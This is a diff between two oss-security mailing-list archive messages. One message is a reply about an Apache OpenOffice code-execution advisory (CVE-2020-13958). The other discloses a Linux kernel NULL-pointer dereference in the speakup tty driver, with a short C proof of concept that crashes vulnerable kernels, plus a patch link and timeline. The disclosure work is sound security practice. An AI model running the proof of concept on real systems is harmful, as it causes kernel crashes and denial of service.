@@ -1,59 +1,70 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/11/4
-Message-ID: <CAPWzz4yY2xMF4ciWRwwEBFd=_EXb12WSXyj290JqJPZGpdHSzg@mail.gmail.com>
-Date: Wed, 11 Nov 2020 10:13:16 +0100
-From: Imre Rad <radimre83@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/19/3
+Message-ID: <CAM1BPE6J_heHs_ckMm5u_Pv6Wnssv_3wgiCNBJs+HLQ+4qkC4A@mail.gmail.com>
+Date: Thu, 19 Nov 2020 10:46:59 +0800
+From: Shisong Qin <qinshisong1205@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: [CVE-2020-13958] Apache OpenOffice - Unrestricted actions leads to arbitrary code execution in crafted documents
+Cc: nopitydays@...il.com
+Subject: Linux kernel NULL-ptr deref bug in spk_ttyio_ldisc_close
 Content-Type: text/plain; charset=utf-8
 
-Proof of concept and more technical details can be found here:
-https://github.com/irsl/apache-openoffice-rce-via-uno-links
+Hi,
 
-Imre
+Recently we found a NULL-ptr deref BUG in spk_ttyio.c in the longterm 4.19
+Linux kernel, and it could also be triggered in the 5.9 Linux kernel. In
+function spk_ttyio_ldisc_close, it would free the "speakup_tty->disc_data"
+and set "speakup_tty" to NULL. However, if we open two tty device and use
+tiocsetd() to set them as "speakup_tty" and close them in turn, the first
+close would set "speakup_tty" to NULL, and in the second close would try to
+dereference the "speakup_tty", leading to a NULL-ptr deref crash.
 
-Dave Fisher <wave@...che.org> ezt írta (időpont: 2020. nov. 11., Sze, 7:38):
->
-> CVE-2020-13958 Unrestricted actions leads to arbitrary code execution in crafted documents
->
-> Fixed in Apache OpenOffice 4.1.8
->
-> Description
->
-> A vulnerability in Apache OpenOffice scripting events allows an attacker to construct
-> documents containing hyperlinks pointing to an executable on the target users file system.
-> These hyperlinks can be triggered unconditionally. In fixed versions no internal protocol
-> may be called from the document event handler and other hyperlinks require a control-click.
->
-> Severity: Low
->
-> There are no known exploits of this vulnerability.
-> A proof-of-concept demonstration exists.
->
-> Vendor: The Apache Software Foundation
->
-> Versions Affected
->
-> Apache OpenOffice 4.0.0, 4.0.1, 4.1.0, 4.1.1, 4.1.2, 4.1.3, 4.1.4, 4.1.5, 4.1.6, and 4.1.7
-> OpenOffice.org versions may also be affected.
->
-> Mitigation
->
-> Install Apache OpenOffice 4.1.8 for the latest maintenance and cumulative security fixes.
-> Use the Apache OpenOffice download page (https://www.openoffice.org/download/).
->
-> Acknowledgments
->
-> The Apache OpenOffice Security Team would like to thank Imre Rad for discovering and
-> reporting this attack vector.
->
-> Further Information
->
-> For additional information and assistance, consult the Apache OpenOffice Community Forums
-> (https://forum.openoffice.org) or make requests to the users@...noffice.apache.org
-> (mailto:users@...noffice.apache.org) public mailing list.
->
-> The latest information on Apache OpenOffice security bulletins can be found at the
-> Bulletin Archive page (https://www.openoffice.org/security/bulletin.html).
-> >
->
+This bug could be reproduced in the longterm 4.19 Linux kernel with
+CONFIG_STAGING=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y.
+To reproduce it in the 5.9 Linux kernel, CONFIG_ACCESSIBILITY=y is also
+required in config, and here is a simple poc:
+
+#define _GNU_SOURCE
+
+#include <dirent.h>
+#include <endian.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+
+int main(void) {
+    int disc = 0x1a;
+    int fd = open("/dev/ptmx", O_RDWR, 0);
+    ioctl(fd, 0x5423, &disc);
+    int fd2 = open("/dev/ptmx", O_RDWR, 0);
+    ioctl(fd2, 0x5423, &disc);
+    return 0;
+}
+
+After the process return, it seems the automated calling to release would
+trigger the NULL-ptr deref bug.
+
+Here is the commit to patch this BUG:
+https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/tty.git/commit/?h=tty-linus&id=d4122754442799187d5d537a9c039a49a67e57f1
+
+Timeline:
+* 2020/11/10 - Vulnerability reported to security@...nel.org
+* 2020/11/11 - Vulnerability confirmed, and reported to
+linux-distros@...openwall.org.
+* 2020/11/19 - Vulnerability opened.
+
+Thanks,
+Shisong Qin and Bodong Zhao, Tsinghua University
+
